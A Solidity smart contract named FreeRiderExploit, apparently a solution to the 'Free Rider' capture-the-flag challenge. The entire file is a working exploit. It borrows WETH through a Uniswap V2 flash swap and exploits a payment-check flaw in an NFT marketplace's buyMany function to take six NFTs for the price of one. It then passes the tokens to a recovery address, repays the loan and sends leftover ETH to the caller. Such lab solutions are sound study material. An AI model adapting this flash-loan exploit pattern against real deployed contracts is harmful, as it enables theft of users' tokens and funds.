// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol"; 
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "solmate/src/tokens/WETH.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";
/**
 * @title FreeRiderExploit
 * @author Jasmine Abtahi
 */
contract FreeRiderExploit is IERC721Receiver{
    using Address for address payable;

    DamnValuableNFT public immutable token;
    IUniswapV2Pair public immutable uniswapPair; 
    FreeRiderNFTMarketplace public immutable marketplace;
    address public immutable recovery;
    WETH public immutable weth;

    constructor(address payable _marketplace, address _uniswapPair, address _recovery) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        token = marketplace.token();
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = WETH(payable(uniswapPair.token0()));
        recovery = _recovery;
    }

    function attack(address receiptant) external {
        //get flashLoan
        uint256 nft_price = 15 ether;
        
        uniswapPair.swap(nft_price, 0, address(this), abi.encode(receiptant));
        payable(receiptant).sendValue(address(this).balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        uint256 numberOfNFTs = 6;
        uint256 nft_price = 15 ether;
        uint256 nft_price_and_fee = (nft_price * 1000)/997 + 1;
        uint[] memory tokenIds = new uint[](numberOfNFTs);

        for(uint i = 0; i < numberOfNFTs; i++) {
            tokenIds[i] = i;
        }

        weth.withdraw(nft_price);

        marketplace.buyMany{value: nft_price}(tokenIds);

        for(uint tokenId = 0; tokenId < numberOfNFTs; tokenId++) {
            token.safeTransferFrom(address(this), address(recovery), tokenId, data);
        }

        weth.deposit{value: nft_price_and_fee}();
        weth.transfer(address(uniswapPair), nft_price_and_fee);
    }
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
